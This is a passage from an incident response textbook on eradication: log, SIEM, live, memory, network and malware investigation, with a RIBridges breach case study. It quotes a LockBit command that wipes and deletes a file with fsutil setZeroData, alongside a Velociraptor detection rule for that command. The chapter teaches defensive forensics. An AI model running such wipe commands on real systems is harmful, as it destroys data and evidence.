Total file size: 35.5 MB

[...]

1 Windows EVTX files stored in the eventlogs directory

Figure 97 | Hayabusa Timeline Report

Hayabusa is a valuable tool for analyzing Windows Event Logs during eradication, but Sigma rules are more

broadly valuable when integrated into SIEM platforms for log investigation at scale.

SIEM for Log Investigation

Security Information and Event Management (SIEM) platforms address the challenge of analyzing disparate

data from multiple log sources. SIEM platforms normalize and aggregate logs into a centralized repository

where analysts can search, correlate, and analyze events across the environment. Instead of manually

reviewing logs on individual systems, responders can query the SIEM for specific indicators of compromise

across all ingested log sources simultaneously. This centralization significantly reduces the time required to

scope an incident and identify all affected systems.

Awkwardly, SIEM is pronounced "seam" or "sim," depending on the vendor.

SIEM platforms provide significant value to incident response by aggregating, normalizing, and correlating

log data from disparate sources. During eradication, this centralized visibility allows responders to quickly

pivot from one indicator of compromise to related events across the entire environment. Analysts can track

a compromised account’s activity from initial authentication through lateral movement to data exfiltration

without manually searching individual system logs. SIEM alerting rules can identify suspicious patterns that

span multiple log sources, such as failed authentication attempts followed by successful logins from unusual

locations. Further, many SIEM platforms support custom detection rules via frameworks such as Sigma,

enabling organizations to rapidly deploy new detections as they discover attacker techniques during

investigations.

However, SIEM platforms also present challenges. The platforms require substantial investment in both

licensing costs and infrastructure to ingest, process, and store large volumes of log data. Effective SIEM

operation demands skilled analysts who understand both the platform’s query language and the nuances of

log data from different sources. Detection rules require continuous tuning to reduce false positives while

maintaining sensitivity to real threats, creating an ongoing maintenance burden. Log sources need to be

properly configured to send relevant data to the SIEM, requiring coordination across IT teams and careful

planning about what to ingest, given storage costs.

Organizations that deploy SIEM platforms without investing in the people, processes, and ongoing

maintenance required to operate them effectively gain little security benefit despite significant financial

investment.

SAME LOGS, DIFFERENT OUTCOMES: THE RIBRIDGES DATA BREACH

In December 2024, the U.S. State of Rhode Island government suffered a compromise that disrupted

services providing food security and health care opportunities to approximately 735,000 citizens. The

threat actor team known as Brain Cipher compromised several state systems, including the RIBridges

platform, after gaining access to a VPN remote access account allocated to a Deloitte contractor

working with the state government. After gaining access, the threat actors exfiltrated sensitive

information about state residents and then extorted the state government into paying not to disclose

the stolen data. [6]

In addition to introducing the vulnerability in the VPN remote access system, Deloitte also managed

security operations for the state government. A subsequent investigation from CrowdStrike revealed

that the threat actors gained access to the Deloitte contractor VPN account in July 2024. The

compromise was not reported to the state until December 5, 2024, after Brain Cipher posted an

extortion notice on its data-leak site. During this five-month dwell time, the attackers exfiltrated data

from multiple systems, including large data transfers to an external cloud storage provider.

CrowdStrike’s report indicates that Deloitte failed to investigate the alerts generated by the state

firewall management portal regarding these large data transfers: [7]

“According to the Crowdstrike (sic) investigation, the RIBridges firewall denied traffic from an

external cloud storage provider IP address to an internal IP address on September 10, 2024, and

between November 11, 2024 and November 28, 2024, the firewall management portal generated 397

alerts from 15 systems about large data transfers to an external cloud storage provider.

— Steve Alder, The HIPAA Journal

Following the breach, Deloitte agreed to pay the state government $5 million to cover incident-

related expenses with no admission of liability. [8]

In October 2025, Deloitte settled a class-action

lawsuit from affected state residents for $6.3 million. [9]

Additional legal actions remain ongoing.

What makes this incident notable is how logging data served two completely different purposes:

• Detection opportunity missed: Deloitte had actionable firewall alerts during the attacker’s dwell

Eradicate Activity | Chapter 13 | 291

time, but did not analyze them, losing the chance to identify exfiltration and contain the

intrusion.

• Incident investigation resource: CrowdStrike used those same firewall logs to rebuild the

attacker’s timeline, quantify exfiltration activity, and anchor the eradicate activity.

The contrast underscores a core principle of incident response: logging supports both threat hunting

and post-compromise analysis. To be effective, organizations need the people and processes to

detect and respond to threats using those resources.

Live Investigation

Live investigation involves using tools directly on systems under investigation to examine their current

configuration and state. Using integrated or third-party tools, analysts can directly collect information

about the configuration of systems including Windows workstations, cloud control plane configurations,

network appliances, and more. Live investigation is often considered the most authoritative source of data

for an investigation, since it reflects the state of the system at the time of examination, with no intermediate

layers that could introduce errors or omissions in the observed data.

While this approach provides valuable insight into system activity and can quickly reveal attacker activity, it

carries risks: running commands modifies system state and can destroy volatile evidence. Ideally, this will

have minimal impact during eradication, since the containment action should have already preserved

necessary evidence.

Use live investigation when responders need immediate answers about system compromise, and the risk of

disrupting evidence is acceptable. Data collected during the contain activity should be sufficient to meet

forensic requirements, allowing the live investigation to focus on rapid assessment rather than on evidence

preservation.

DIFFERENTIAL ANALYSIS FOR THREAT INVESTIGATION

Differential analysis is a threat investigation technique that allows analysts to quickly sort through

large volumes of data by comparing known-good baselines to current system states. It works

particularly well for live investigation scenarios and for PowerShell output, where the data can be

formatted into a simple structure.

Consider for example the task of identifying new or modified services on a Windows system. Running

Get-Service in PowerShell produces a list of all services, but sorting through hundreds of entries to

find suspicious services can be time-consuming. With a known-good baseline of services captured

previously, analysts can apply differential analysis to quickly identify new or modified services.

To demonstrate, start by capturing a baseline of services on a known-good system using PowerShell

into a file called baseline-services-20251117.txt as shown in Listing 64 . The output is saved to a

removable storage drive or network attached storage for later comparison. Next, the analyst runs the

same command on the system under investigation, saving the output to services-

liveinvestigation.txt as shown in Listing 65.

Listing 64 | Capturing Baseline Services on Known-Good System

PS C:\> Get-Service > E:\baseline-services-20251117.txt 1

1 Run on the known-good system, such as a freshly imaged workstation.

Listing 65 | Capturing Current Services on System Under Investigation

PS C:\> Get-Service > E:\services-liveinvestigation.txt 1

1 Run on the system under investigation.

Finally, on the analyst’s workstation, PowerShell reads the two files into variables ( $baseline and

$current) then uses Compare-Object to compare the two files and identify differences, as shown in

Listing 66.

Listing 66 | Compare Baseline and Current Services

PS C:\investigation> $baseline = Get-Content .\baseline-services-20251117.txt

PS C:\investigation> $current = Get-Content .\services-liveinvestigation.txt

PS C:\investigation> Compare-Object -ReferenceObject $baseline -DifferenceObject $current

InputObject                                              SideIndicator

-----------                                              -------------

Stopped  sppsvc             Software Protection          ⇒

Stopped  TrustedInstaller   Windows Modules Installer    ⇒

Running  vjnxSoIt           HQIQATUbyNM                  ⇒

Running  sppsvc             Software Protection          ⇐

Running  TrustedInstaller   Windows Modules Installer    ⇐

The output of Compare-Object produces a much smaller subset of data for analysis, revealing:

• The sppsvc (Software Protection service) changed state from Running to Stopped on the system

under investigation.

• The TrustedInstaller (Windows Modules Installer service) also changed state from Running to

Stopped.

• A new service vjnxSoIt is running on the system under investigation that did not exist in the

baseline.

Differential analysis can be applied to many types of data collected during live investigation, including

running process names, installed software, scheduled tasks, users and groups, and more. It is an

effective tool for quickly eliminating known-good data from the analysis, allowing analysts to focus on

new or modified artifacts that may indicate attacker activity.

Endpoint Telemetry Investigation Tools

Using endpoint telemetry tools to investigate an endpoint is another form of live investigation, but one that

is easily automated and distributed across many systems from a centralized management console. Platforms

such as Velociraptor, GRR Rapid Response , and Osquery provide endpoint telemetry and investigation

capabilities that enable responders to query system state, configuration, and activity across multiple

endpoints. These platforms are particularly useful for analyzing attacker activity using known Indicators of

Compromise (IOCs) and Events of Interest (EOIs), enabling responders to quickly identify compromised

systems and artifacts for eradication.

Eradicate Activity | Chapter 13 | 293

Endpoint telemetry and investigation tools are related to but distinct from EDR platforms.

Where EDR platforms focus on detecting and responding to threats with preprogrammed

detection logic, endpoint telemetry and investigation tools focus on providing visibility into

system state and configuration for analysis. While endpoint telemetry tools may have some

response capabilities, they are not designed to provide the full range of response actions

available in EDR platforms, instead focusing on enabling analysts to perform investigative

analysis using IOCs or other custom logic.

Endpoint telemetry platforms often leverage an agent installed on endpoints to collect and report system

state, configuration, and activity information using canned or custom hunts or queries. Using a centralized

management console, analysts can design queries to collect information from multiple endpoints

simultaneously, guiding an investigation into attacker activity and identifying compromised systems.

As part of an incident response eradication effort, analysts can use these platforms to investigate EOIs and

IOCs across multiple endpoints. Often, these platforms provide asynchronous query capabilities, enabling

analysts to run queries across many endpoints and obtain rapid results from accessible systems. Offline

systems report their results when they come back online.

Velociraptor IOC Analysis Example

Consider an example in which an analyst is investigating a LockBit ransomware attack using Velociraptor.

Working from known IOCs for LockBit, or using earlier investigative data (such as live investigation from a

single host), the analyst identifies a suspicious invocation of the Windows fsutil.exe utility, as shown in

Listing 67.

Listing 67 | LockBit fsutil SetZeroData Example

cmd.exe /C ping 127.0.0.7 -n 3 > Nul & fsutil file setZeroData offset=0 length=524288

"C:\Users\Jeanluc\Desktop\Lsystem-7d7904945fa2.exe" & Del /f /q

"C:\Users\jeanluc\Desktop\Lsystem-7d7904945fa2.exe"

On the system under investigation, the fsutil file setZeroData  command was used to overwrite an

existing file ( Lsystem-7d7904945fa2.exe, the LockBit malware executable) using a repeating null byte range

without changing its size, effectively wiping the file’s contents. This anti-forensics technique is used by

LockBit and other ransomware platforms to destroy data in place as part of the ransomware operation,

hampering investigators' ability to analyze the malware and its behavior. However, it also creates an

opportunity for investigators to identify other systems that may have also been compromised using the

fsutil file setZeroData command pattern.

To identify other systems that also observed this command execution with the setZeroData pattern, analysts

can use endpoint telemetry tools including Velociraptor. The YAML artifact shown in Listing 68 hunts for

the pattern setZeroData across multiple Windows logging sources.

Listing 68 | Custom Velociraptor Artifact for IOC Hunting: FsutilSetZeroData

name: Custom.Windows.Detection.FsutilSetZeroData

author: Joshua Wright

description: |

Hunts for invocations of `fsutil file setZeroData`, an in-place file-wiping technique that

zeroes a byte range inside a file without changing its size. Used by LockBit and other

ransomware platforms.

reference:

- https://lolbas-project.github.io/lolbas/Binaries/Fsutil/

- https://attack.mitre.org/techniques/T1485/

- https://attack.mitre.org/techniques/T1070/004/

type: CLIENT

parameters:

- name: IocRegex

type: regex

default: "(?i)setzerodata"

description: |

Match token `setZeroData` which is effectively unique to this fsutil verb.

- name: ChannelRegex

default: "(?i)security|sysmon|powershell"

description: |

Restrict to the channels that carry a command line.

sources:

- query: |

SELECT *

FROM Artifact.Windows.EventLogs.EvtxHunter(

IocRegex=IocRegex,

ChannelRegex=ChannelRegex)

After creating the detection rule in Velociraptor, the analyst can launch a new hunt across the environment

to identify other systems that observed the LockBit fsutil file setZeroData command. An example of the

results from this hunt is shown in Figure 98 , revealing an additional system that executed the same

command, providing a new lead for additional eradication actions.

Eradicate Activity | Chapter 13 | 295

Figure 98 | Velociraptor Artifact Hunt Results: FsutilSetZeroData

The primary advantage of endpoint telemetry platforms is the ability to quickly and efficiently investigate

multiple endpoints. Used for investigating the details of an incident during eradication ( what other systems

exhibit this behavior), or as part of a broader threat-hunting program for scoping an incident, telemetry data

accessed through a centralized management console enables analysts to quickly pivot from one system to

another. Analysts pivot using creative analysis techniques in the form of detection rules, queries, and hunts.

Memory Investigation

Memory analysis offers a less intrusive alternative to live investigation while providing deep insight into

system compromise. Capturing and analyzing system memory enables responders to identify malicious

processes, network connections, and other artifacts offline using only the captured memory image and

analysis tools. Because it is performed offline, memory analysis can be easily distributed to multiple analysts

for parallel investigation.

Memory investigation captures the otherwise volatile state of a system, preserving artifacts that may not be

present on disk or in logs. Using captured memory is particularly valuable for identifying the system or

process configuration without relying on the running system as an investigative target. Memory analysis can

be performed at two levels: whole-system and process-specific.

Process-Specific Memory Investigation

Process memory dumps capture the working memory of a single running process rather than the entire

system’s physical memory. This targeted approach reduces the volume of collected data and focuses

analysis on the specific process of interest, making it ideal for investigating suspicious applications or

malware.

Start by suspending the target process to ensure memory contents remain stable during capture.  The

Microsoft SysInternals tool PsSuspend freezes the process without terminating it, preventing the process

from modifying its memory during the capture.  After freezing the process, ProcDump (also from

SysInternals) can create a complete memory dump of the suspended process, as shown in Listing 69.

Listing 69 | Capturing Process Memory with PsSuspend and ProcDump

C:\Users\jwrig> Z:\pssuspend.exe winword.exe 1

PsSuspend v1.08 - Process Suspender

Copyright © 2001-2023 Mark Russinovich

Sysinternals

Process winword.exe suspended.

C:\Users\jwrig> Z:\procdump.exe -ma winword.exe 2

ProcDump v11.1 - Sysinternals process dump utility

Copyright © 2009-2025 Mark Russinovich and Andrew Richards

Sysinternals - www.sysinternals.com

[09:15:48]Dump 1 info: Available space: 1460809175040

[09:15:48]Dump 1 initiated: C:\Users\jwrig\WINWORD.EXE_251123_091548.dmp

[09:15:48]Dump 1 writing: Estimated dump file size is 850 MB.

[09:15:49]Dump 1 complete: 851 MB written in 1.2 seconds

[09:15:49]Dump count reached.

C:\Users\jwrig> Z:\pssuspend.exe -r winword.exe 3

PsSuspend v1.08 - Process Suspender

Copyright © 2001-2023 Mark Russinovich

Sysinternals

Process winword.exe resumed.

1 Suspend the target process to freeze the memory state.

2 Create a full memory dump of the suspended process.

3 Resume the target process after memory capture.

The -ma flag in ProcDump creates a full memory dump including all accessible memory for the process. This

comprehensive capture ensures all process memory regions are collected, including heaps, stacks, and

Eradicate Activity | Chapter 13 | 297

loaded modules.

Process memory dumps can be analyzed with standard debugging tools such as WinDbg and x64dbg, or

with straightforward string extraction. In Listing 70, Sysinternals Strings extracts readable strings from the

Word process memory dump. With the extracted strings, analysts can search for indicators of compromise,

such as PowerShell commands and accompanying command-line arguments, as shown in Listing 71.

Listing 70 | Extracting Strings from Process Memory Dump

C:\Users\jwrig> Z:\strings.exe .\WINWORD.EXE_251123_091548.dmp > winword_strings.txt

Listing 71 | Searching for PowerShell Commands in Process Memory Strings

C:\Users\jwrig> Select-String -Encoding Unicode -Pattern "powershell\s+-" .\winword_strings.txt

winword_strings.txt:2832782:powershell -NoProfile -NonInteractive -c "Get-Process"

winword_strings.txt:2832787:powershell -NoProfile -NonInteractive -c "Get-Process 1Password" 2

1 PowerShell search for Unicode-encoded strings in memory dump.

2 PowerShell command revealed in Word process memory.

Process-specific memory investigation is useful for focusing on artifacts from a given process with a small

capture data set, but it does not provide in-depth insight into the configuration of the entire system. Use

process memory captures when analysts have identified specific suspicious processes and need a detailed

analysis of their runtime behavior. For broader investigations that require visibility into all running

processes, network connections, and kernel artifacts, whole-system memory capture provides greater

value.

Whole-System Memory Investigation

Whole-system memory investigation captures the complete physical memory of a compromised system,

preserving all running processes, network connections, registry data, and kernel artifacts. This

comprehensive approach to memory capture provides visibility into the entire system state, making it

valuable for investigations that require broad context into attacker activity across the target system.

Capturing and Analyzing Memory with Volatility

Memory capture tools acquire physical RAM and paged memory (swap) from the running system without

requiring a reboot.  Windows systems can use WinPMEM, while Linux systems commonly use LiME (Linux

Memory Extractor). The time required to capture memory depends on the amount of RAM and system

performance, but typically takes only a few minutes, as shown in Listing 72. The captured memory image

preserves volatile artifacts that disappear when the system is powered off, including running processes,

network connections, decrypted data, and malware residing only in memory.

Listing 72 | Capturing Whole-System Memory with WinPMEM

F:\> .\go-winpmem_amd64_1.0-rc2_signed.exe acquire --nosparse ircase504.dmp 1

Writing driver to C:\Users\jwrig\AppData\Local\Temp\1405366611.sys

Creating service winpmem

Installed service winpmem

Started service winpmem

Memory Info:

CR3: 0x1ae002

NtBuildNumber: 0x65f4

KernelBase: 0xfffff806d4000000

[...]

Padding 8320 pages from 0x45f80000

Copying 3584 pages (0xe00000) from 0x48000000

Padding 750080 pages from 0x48e00000

Copying 3860480 pages (0x3ae800000) from 0x100000000

Completed imaging in 53.568839s 2

Stopped service winpmem

Removing driver from C:\Users\jwrig\AppData\Local\Temp\1405366611.sys

1 Acquire a whole-system memory image with WinPMEM.

2 Memory capture completed in under one minute for the target with 32 GB RAM.

After capturing memory, analysts can use tools like Volatility and MemProcFS to extract and analyze

artifacts from the memory dump. Volatility provides plugins that parse memory structures to reveal

processes, network connections, loaded modules, registry hives, and other artifacts. This offline analysis

allows multiple analysts to examine the same memory image in parallel without impacting the running

system.

Volatility runs on any system with a Python 3 environment, and can analyze memory

captures for Windows, Linux, and macOS systems.

One particularly valuable resource from Volatility memory analysis is the enumeration of installed drivers

on a Windows system. Windows drivers with vulnerabilities represent an opportunity for an attacker to gain

escalated privileges, ultimately allowing attackers to disable endpoint protection systems and other system

controls. The driver enumeration scan in Listing 73  uses Volatility to display all loaded drivers from the

captured memory image, including the suspicious KfeCoSvc driver associated with Kyocera printer software

that is vulnerable to privilege escalation attacks [10]

.

Listing 73 | Volatility Windows Driver Enumeration

$ vol -qf ircase504.dmp windows.driverscan.DriverScan 1

Volatility 3 Framework 2.26.2

Offset         Start          Size      Name

0xbf84ba6cf4d0 0xf80666610000 0x2a000   \Driver\acpiex

0xbf84ba707e10 0xf80666860000 0x93000   \Driver\pci

0xbf84ba757cb0 0xf8067b3b0000 0x12000   \Driver\uiomap

0xbf84ba7eac10 0xf806d4000000 0x0       \Driver\WMIxWDM

0xbf84ba8ccdf0 0xf806d4000000 0x0       \Driver\PnpManager

0xbf84ba8cedf0 0xf806d4000000 0x0       \Driver\SoftwareDevice

0xbf84ba8cfdf0 0xf806d4000000 0x0       \Driver\DeviceApi

0xbf84ba8d4df0 0xf806d4000000 0x0       \Driver\ACPI_HAL

Eradicate Activity | Chapter 13 | 299

0xbf84ba9d0060 0xf80666640000 0xa000    lxss

0xbf84ba9d7e20 0xf80665960000 0xe0000   CNG

[...]

0xbf84ea056e20 0xf80682840000 0x1160000 \Driver\KfeCoSvc 2

0xbf84ea05ee20 0xf80681cc0000 0xd5000   \Driver\PEAUTH

[...]

0xbf84fca729d0 0xf806826e0000 0x1b000   \Driver\WdNisDr

0xbf84fe14fe20 0xf806839b0000 0x10000   \Driver\winpmem 3

0xbf84fe2f3aa0 0xf80682800000 0xf000    \Driver\WpdUpFltr

1 Enumerate running drivers from the memory image (output has been modified to fit within the available space).

2 KfeCoSvc driver associated with Kyocera software.

3 WinPmem driver used for memory capture.

Browsing Memory Artifacts with MemProcFS

While Volatility remains the most widely used memory analysis framework, MemProcFS offers a compelling

alternative that can accelerate memory investigation during eradication. MemProcFS mounts a memory

image as a virtual file system, allowing analysts to browse memory contents using familiar file navigation

tools rather than running individual plugins and waiting for output.

The file system abstraction in MemProcFS provides immediate access to processes, modules, handles,

registry hives, and network connections through a directory structure. Further, MemProcFS integrates with

other analysis tools through the file system interface, allowing analysts to use standard UNIX or PowerShell

commands to search, filter, and extract artifacts from memory.

For example, after collecting a memory image with WinPMEM, the analyst mounts it using MemProcFS as

shown in Listing 74 . Next, analysts search the mounted file system for instances of backup.exe, an IoC

identified during log investigation, using PowerShell Get-ChildItem and Select-String as shown in Listing 75.

The search revealed multiple artifacts associated with backup.exe, including registry entries, prefetch files,

and file reads from the user’s Downloads folder.

Listing 74 | Mount Memory Image with MemProcFS

PS C:\tools\MemProcFS> .\MemProcFS.exe -device F:\memory.dmp -forensic 1

Initialized 64-bit Windows 10.0.26100

==============================  MemProcFS  ==============================

- Author:           Ulf Frisk - pcileech@frizk.net

- Info:             https://github.com/ufrisk/MemProcFS

- Discord:          https://discord.gg/pcileech

- License:          GNU Affero General Public License v3.0

- Licensed To:      GNU Affero General Public License v3.0 - OPEN SOURCE USER.

---------------------------------------------------------------------

MemProcFS is free open source software. If you find it useful please

become a sponsor at: https://github.com/sponsors/ufrisk Thank You :)

---------------------------------------------------------------------

- Version:          5.16.8 (Windows)

- Mount Point:      M:\

- Tag:              26100_852e07b1

- Operating System: Windows 10.0.26100 (X64)

==========================================================================

Listing 75 | Search MemProcFS Filesystem for Indicator of Compromise

PS M:\> Get-ChildItem -Path .\forensic\ -Recurse -File | Select-String -SimpleMatch 'backup.exe'

forensic\csv\timeline_all.csv:231:"2025-03-07

19:41:11",REG,MOD,0,0x0,0x0,\Root\InventoryApplicationFile\backup.exe|87931ab5a15fc7f5 1

forensic\csv\timeline_all.csv:266:"2025-03-07

19:41:09",NTFS,MOD,0,0x0,0x5efbc400,\1\Windows\Prefetch\BACKUP.EXE-AB6C9DDF.pf 2

forensic\csv\timeline_all.csv:277:"2025-03-07

19:41:08",NTFS,CRE,0,0x0,0x5efbc400,\1\Windows\Prefetch\BACKUP.EXE-AB6C9DDF.pf 3

forensic\csv\timeline_all.csv:1496:"2025-03-07

19:41:04",NTFS,RD,0,0xb49ae6,0x77d06400,"\1\Users\Robert Paulson\Downloads\backup.exe" 4

[...]

1 Registry entry for the application file inventory hive for backup.exe

2 Modification of the prefetch file for backup.exe

3 Creation of the prefetch file for backup.exe

4 Read the backup.exe file from Robert Paulson’s Downloads folder.

Whole-system memory investigation provides the broad visibility needed to understand attacker activity

across the entire system. Use whole-system memory capture when investigating unknown compromises,

mapping attacker lateral movement, or identifying all systems and processes requiring eradication. The

comprehensive nature of whole-system memory analysis makes it particularly valuable during the eradicate

activity, ensuring analysts identify all attacker artifacts before recovery begins.

Network Investigation

Network analysis provides broad visibility into attacker communications and data exfiltration activities.

Unlike host-based investigation, which focuses on individual systems, network analysis reveals how the

attacker moved through the environment, which systems they accessed, and what data they may have

exfiltrated. This broader context of the attacker’s behavior across systems complements the detailed insight

that host-focused analysis provides. This perspective is essential for understanding the full scope of

compromise and identifying all systems requiring eradication efforts.

Network Data Sources

Network investigation during eradication relies on multiple data sources that offer varying levels of visibility

into attacker activity.  Packet capture (PCAP) offers the most detailed view, recording complete network

conversations including payload data. When available, packet captures allow analysts to reconstruct exactly

which data the attacker accessed or exfiltrated, which commands they executed over the network, and

which tools they deployed. However, full packet capture generates enormous storage requirements and is

typically limited to specific network segments or time windows. The cost-benefit of PCAP has also degraded

as encrypted traffic has become the norm: most attacker communications are now encapsulated by TLS,

making captures less valuable for analyzing attacker activity without decryption capabilities in place.

NetFlow and similar flow data (IPFIX, sFlow) provide a more scalable alternative, recording metadata about

network connections, including source and destination addresses, ports, protocols, byte counts, and

timestamps without capturing payload content. Flow data reveals connection patterns and data transfer

Eradicate Activity | Chapter 13 | 301

volumes, making it valuable for identifying lateral movement and data exfiltration even when packet

captures are unavailable.

DNS logs represent another important data source that attackers often overlook when covering their tracks.

Every system lookup for command-and-control domains, malware distribution sites, or exfiltration

endpoints leaves a record in DNS logs. Proxy logs provide similar visibility into web traffic, capturing URLs,

user agents, and response codes that reveal the behavior of attacker tools and data-staging activities. Many

attackers tunnel their communications through web proxies to blend with normal traffic, making proxy logs

essential for understanding the full scope of attacker operations. Firewall logs round out the perimeter view,

documenting allowed and blocked connection attempts that help identify both successful attacker access

and failed reconnaissance attempts.

Network Detection and Response Platforms

Organizations that have deployed Network Detection and Response (NDR) platforms gain significant

investigative advantages during eradication. While often positioned as tools for threat hunting and real-time

detection, NDR platforms also offer valuable investigative features that help responders understand attacker

activity across the network. These systems integrate multiple detection capabilities, including signature-

based alerting, machine-learning-based anomaly detection, behavioral analytics, and threat intelligence

integration. For incident response analysts, alerts generated by NDR platforms provide a valuable

investigative resource, enabling responders to quickly identify suspicious network activity associated with

the incident.

NDR tools often provide built-in investigation workflows that guide analysts through examining network

activity, pivoting from one indicator to related events across the environment. These workflows can

accelerate initial analysis, helping responders identify systems requiring deeper investigation. However,

analysts should treat NDR findings as one input among many rather than a complete picture of attacker

activity. The real value of NDR during eradication lies in its ability to surface connection patterns and

anomalies that point to compromised systems, which responders can then investigate using the network

data sources and connection-mapping techniques described below.

NDR platforms surface connection patterns and anomalies. Use these findings as a starting

point for deeper investigation with other network data sources.

Network Data for Connection Mapping

Beyond NDR platforms, responders can analyze raw network data to map attacker connections directly.

This approach works with the flow data, DNS logs, and firewall logs available in most environments,

providing connection mapping capabilities without specialized NDR tooling. By mapping these connections,

responders can ensure that eradication actions address every compromised system, removing all attacker

access points.

For example, consider an incident where an attacker gained unauthorized access to a system in an AWS

environment. Using Virtual Private Cloud (VPC) flow logs, responders can reconstruct the attacker’s

network connections to identify all the systems they accessed.

One option for visualizing these connections is to generate a network connectivity graph using the VPC

Flow Log Analysis tool. Written by Florian Pfisterer (with a simplified fork by this author), this open-source

tool processes VPC flow logs and generates a visual graph of network connections, with thicker lines

indicating greater data transfer between systems. [11]

Using this author’s fork of the VPC Flow Log Analysis tool, analysts can generate a network connectivity

graph from VPC flow logs collected during the incident. The example in Listing 76  demonstrates the

commands used to combine VPC flow log files collected from the AWS S3 log storage destination, generate

the network graph data, and start a local web server to visualize and interact with the graph. By assigning

host names in the graph-generator/known-ips.ts file, responders can easily review connectivity between the

systems under investigation and other systems in the environment.

Listing 76 | AWS VPC Flow Log Analysis Graph Generation

$ gzcat ~/flowlogs/*.log.gz > flowlogs_combined.txt 1

$ head -4 ../flowlogs_combined.txt

2 058390152209 eni-e362dfbb 10.0.2.1 10.0.3.1 50413 5432 6 11 34622 1764152928 1764152962 REJECT

OK

2 058390152209 eni-e978320b 10.0.2.2 10.0.3.1 56261 5432 6 74 64131 1764153408 1764153436 ACCEPT

OK

2 058390152209 eni-9991a6a9 10.0.5.1 10.0.4.1 65098 443 6 254 2911921 1764155508 1764155560

ACCEPT OK

2 058390152209 eni-429b8a69 10.0.1.1 10.0.2.2 32540 443 6 214 4242067 1764151368 1764151400

ACCEPT OK

$ LOG_TEXT=../flowlogs_combined.txt npm run build-graph 2

> vpc-flow-log-analysis@1.0.0 build-graph

> ts-node ./graph-generator/build-graph.ts

read and parse requests: 63.438ms

Found 90436 requests.

generate nodes and edges: 23.035ms

export graph data to file: 0.718ms

Exported log graph to /Users/jwright/flowlogs/vpc-flow-log-analysis/client/graph.json

$ npm run client 3

> vpc-flow-log-analysis@1.0.0 client

> ./node_modules/http-server/bin/http-server client

Starting up http-server, serving client

Available on:

http://127.0.0.1:8080

http://192.168.1.140:8080

Hit CTRL-C to stop the server

1 Decompress and combine all VPC flow log files into a single text file for analysis.

2 Generate network graph data from combined VPC flow logs.

3 Start the local web server to visualize and interact with the generated network graph.

Eradicate Activity | Chapter 13 | 303

Figure 99 | AWS VPC Flow Log Connection Graph

Network investigation findings directly inform eradication scope: every system the attacker accessed

requires examination for persistence mechanisms, every external IP address contacted should be blocked,

and every compromised credential used for lateral movement should be rotated. Visualization or other

network mapping techniques help responders understand the attacker’s actions and ensure eradication

actions address all compromised systems.

Malware Investigation

When malware is discovered during the incident, detailed analysis becomes essential for effective

eradication. Understanding what the malware does, how it persists, and what network infrastructure it uses

directly informs eradication actions: responders need to know what artifacts to remove, what network

connections to block, and what other systems might be infected with the same malware.

Malware analysis during eradication serves specific practical objectives. The primary goals focus on

gathering actionable intelligence: determine whether a suspicious file is malicious, enumerate the artifacts

it creates (files, registry keys, and processes), identify persistence mechanisms that require removal, and

extract network indicators of compromise (IOCs) for continued scoping and containment.

Malware investigation involves both static and dynamic analysis techniques. While comprehensive malware

analysis is a specialized discipline that requires extensive expertise, incident responders need fundamental

capabilities to assess whether executables are malicious and understand their basic functionality.

SAFETY IN MALWARE ANALYSIS

Analysts should apply caution when working with and handling malicious code. It is very easy to

accidentally execute malware during analysis, to distribute it unintentionally, or to tip off attackers

that their code is being studied.

Safe malware analysis requires strict isolation procedures:

• Use a dedicated analysis system that never connects to production networks.

• Never store production data, credentials, or sensitive information on analysis systems.

• Whenever possible, perform analysis in virtual machines with snapshots for quick restoration to a

clean state.

• Disable shared folders, clipboard sharing, drag-and-drop, and other VM integration features.

• Avoid using broadly-accessible network storage for malware samples.

• Transport malware samples on clearly labeled removable media, encrypted and password-

protected.

• For high-risk samples, use air-gapped systems with no network connectivity.

Malware investigation can provide valuable insight into the incident response process, but requires

careful handling to avoid unintended consequences.

Static Analysis

Static analysis involves examining the malware binary without executing it. This approach is safer than

running the malware (though it still requires safe handling of the malware; see the sidebar Safety in Malware

Analysis) and can quickly reveal useful information about the sample’s purpose and capabilities.

Static analysis techniques can include:

• File identification (name, size, metadata attributes)

• File hashing

• Strings extraction

• PE (Portable Executable) structure analysis

• Disassembly of code sections

• Cross-referencing observed artifacts with threat intelligence sources

Basic identification and file hashing provide a foundation for further analysis with cyber threat intelligence

(CTI) sources. Threat intelligence platforms like VirusTotal, Hybrid Analysis, and other online services allow

analysts to submit file hashes and retrieve existing analysis reports. Using a hash (or other identifying

characteristic, such as a string-based search) allows analysts to collect and review CTI insight without

having to share the malware sample itself. An example hash search result for a malware sample using

VirusTotal is shown in Figure 100.

Eradicate Activity | Chapter 13 | 305

Figure 100 | VirusTotal Search Result for File Hash

If the hash matches a known malware family, analysts may find existing analysis reports for

other samples in the same family that describe the malware’s behavior, persistence

mechanisms, and network infrastructure, potentially saving hours of manual analysis.

Different malware versions in the same family will often share similar characteristics,

allowing responders to apply existing knowledge to new samples.

Analysts can gain considerable insight by analyzing file metadata and the structure of malware samples.  For

Windows malware samples, PE (Portable Executable) analysis tools like PE Studio or PE-Bear reveal

compilation timestamps, imported libraries and functions, embedded resources, and digital signature

information. Imported functions can reveal what capabilities the malware uses: imports from ws2_32.dll

indicate network activity, crypt32.dll suggests encryption routines, and advapi32.dll functions like

RegSetValueEx indicate registry manipulation. The example in Figure 101  shows PE-Bear’s analysis of a

malware sample, revealing imported functions from kernel32.dll including functionality to determine if the

malware is running in a debugger, a common tactic used to detect a sandboxed environment.

Figure 101 | PE-Bear PE Malware Analysis Example

For deeper analysis, tools like Ghidra reveal the disassembled code, though this level of analysis requires

significant expertise and time.

Static analysis provides analysts with valuable insight into malware samples without the risks associated

with execution. However, it has limitations: static analysis may not reveal the full behavior of the malware,

especially if it employs obfuscation or other anti-analysis techniques. To gain a more comprehensive

understanding of malware functionality, dynamic analysis is often necessary.

Dynamic Analysis

Dynamic analysis involves executing the malware in a controlled environment and observing its behavior.

This approach reveals what the malware actually does rather than what it might do. The tradeoff is

increased risk: analysts will be running malicious code, which requires careful isolation to prevent

unintended consequences.

The basic workflow for dynamic analysis follows a consistent pattern:

• Prepare the environment : Start and configure monitoring tools, but keep recording disabled until

analysis begins.

• Snapshot the environment: Take a virtual machine snapshot immediately before executing the malware

to accommodate quick restoration.

• Enable monitoring tools : Start recording with the desired monitoring tools before launching the

malware sample.

• Execute the malware : Run the sample and interact with it as needed to trigger functionality (clicking

prompts, providing input, or waiting for scheduled triggers).

• Terminate the malware: End the malware process using commands such as kill or Stop-Process, or via

GUI tools.

• Stop monitoring tools: Disable recording to capture a clean end state.

Eradicate Activity | Chapter 13 | 307

• Review the output : Analyze captured data to identify artifacts, persistence mechanisms, and network

activity.

